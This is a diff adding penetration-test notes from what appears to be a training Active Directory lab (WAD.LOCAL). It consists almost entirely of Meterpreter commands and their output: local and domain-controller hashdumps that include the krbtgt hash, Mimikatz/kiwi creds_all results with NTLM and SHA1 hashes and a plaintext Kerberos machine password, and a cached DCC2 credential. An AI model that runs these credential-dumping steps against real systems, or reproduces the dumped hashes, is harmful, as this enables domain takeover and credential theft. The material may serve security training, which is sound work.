@@ -355,3 +355,81 @@ student8    WAD.LOCAL  (null)
 student9    WAD.LOCAL  (null)
 toto13      wad.local  (null)
 wad-sql01$  WAD.LOCAL  (null)
+
+/hash dump .12
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:2e71b731ab1d9633b426042fa274e4f3:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+
+/load kiwi 
+meterpreter > creds_all                                                                               
+[+] Running as SYSTEM
+[*] Retrieving all credentials
+msv credentials
+===============
+
+Username       Domain  NTLM                              SHA1                                      DPAPI
+--------       ------  ----                              ----                                      -----
+Administrator  WAD     3b7dc65cdb8cbca43bbcc513fdd03510  afec07af16dfd6a7346544f04f454a7a4821dbf8  e67da2b8b5053e26818e7f69d332fd70
+WAD-WEB01$     WAD     ab9ef348b9375a717f22ea680ec34eb7  e928516d450f9b3b4b0ec3f0cc9838f314a4e4ea  
+
+wdigest credentials
+===================
+
+Username       Domain  Password
+--------       ------  --------
+(null)         (null)  (null)
+Administrator  WAD     (null)
+WAD-WEB01$     WAD     (null)
+
+kerberos credentials
+====================
+
+Username       Domain     Password
+--------       ------     --------
+(null)         (null)     (null)
+WAD-WEB01$     wad.local  Pz@h9AXY$#5^#pS@iN^w)Ob2$;Mv?z(12AEQ_ng=qMwORdHG"Y%%Re@tfW>eYng_9y3QbV*bZS72"e7/;J(<KS@K,n7!Zr^?b6A)XlI(w"J9XN4-6%-ssnbT
+administrator  WAD.LOCAL  (null)
+wad-web01$     WAD.LOCAL  (null)
+
+
+/cache dump .12
+administrator:$DCC2$10240#administrator#3943e4aa32928539f315f747eff3d534::
+
+
+/hashdump sur DC 
+meterpreter > hashdump                                                                                
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:3b7dc65cdb8cbca43bbcc513fdd03510:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9353ef3355f52f6b9508448123397775:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+svc_sched:1103:aad3b435b51404eeaad3b435b51404ee:42e3554265eaa01e4d2c9adc396317bd:::
+svc_join:1104:aad3b435b51404eeaad3b435b51404ee:f1936cfdaa39741ae97def021531080d:::
+svc_sql:1105:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+student1:1106:aad3b435b51404eeaad3b435b51404ee:e10ae333f1fecab8972c1a19bfe50313:::
+student2:1107:aad3b435b51404eeaad3b435b51404ee:e10ae333f1fecab8972c1a19bfe50313:::
+student3:1108:aad3b435b51404eeaad3b435b51404ee:e10ae333f1fecab8972c1a19bfe50313:::
+student4:1109:aad3b435b51404eeaad3b435b51404ee:e10ae333f1fecab8972c1a19bfe50313:::
+student5:1110:aad3b435b51404eeaad3b435b51404ee:e10ae333f1fecab8972c1a19bfe50313:::
+student6:1111:aad3b435b51404eeaad3b435b51404ee:e10ae333f1fecab8972c1a19bfe50313:::
+student7:1112:aad3b435b51404eeaad3b435b51404ee:e10ae333f1fecab8972c1a19bfe50313:::
+student8:1113:aad3b435b51404eeaad3b435b51404ee:e10ae333f1fecab8972c1a19bfe50313:::
+student9:1114:aad3b435b51404eeaad3b435b51404ee:e10ae333f1fecab8972c1a19bfe50313:::
+student10:1115:aad3b435b51404eeaad3b435b51404ee:e10ae333f1fecab8972c1a19bfe50313:::
+student11:1116:aad3b435b51404eeaad3b435b51404ee:e10ae333f1fecab8972c1a19bfe50313:::
+student12:1117:aad3b435b51404eeaad3b435b51404ee:e10ae333f1fecab8972c1a19bfe50313:::
+student13:1118:aad3b435b51404eeaad3b435b51404ee:e10ae333f1fecab8972c1a19bfe50313:::
+student14:1119:aad3b435b51404eeaad3b435b51404ee:e10ae333f1fecab8972c1a19bfe50313:::
+student15:1120:aad3b435b51404eeaad3b435b51404ee:e10ae333f1fecab8972c1a19bfe50313:::
+student16:1121:aad3b435b51404eeaad3b435b51404ee:e10ae333f1fecab8972c1a19bfe50313:::
+WAD-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:c48d777c3d879717ce6d8277bee8e0b1:::
+WAD-SQL01$:1122:aad3b435b51404eeaad3b435b51404ee:3ee90156605fe3bd77a71a11bd926818:::
+WAD-WEB01$:1123:aad3b435b51404eeaad3b435b51404ee:ab9ef348b9375a717f22ea680ec34eb7:::
+DESKTOP-MAIEURS$:1124:aad3b435b51404eeaad3b435b51404ee:408c45dae4b6a97c0f633d7051d9d2a8:::
+DESKTOP-LPEWTDC$:1125:aad3b435b51404eeaad3b435b51404ee:5a9f8f47db613b7645fc03ff3d8187cf:::
+DESKTOP-HXTPCVD$:1126:aad3b435b51404eeaad3b435b51404ee:56de3036791b0557b4ee5bfe2a8b0bed:::
+DESKTOP-FLMWEYO$:1127:aad3b435b51404eeaad3b435b51404ee:0db3b60810690ae8dda69119afdf1d5d:::
+DESKTOP-EQDJAKZ$:1128:aad3b435b51404eeaad3b435b51404ee:f7919c8a3bb17d964a6ebfebc45ad0d3:::
+DESKTOP-PNCQTRO$:1129:aad3b435b51404eeaad3b435b51404ee:eff38d116f3d14bfc8c8893b732e0d69:::
+DESKTOP-GLBNZRW$:1130:aad3b435b51404eeaad3b435b51404ee:d8c6f4be53a5488553cf311968e7346b:::
+
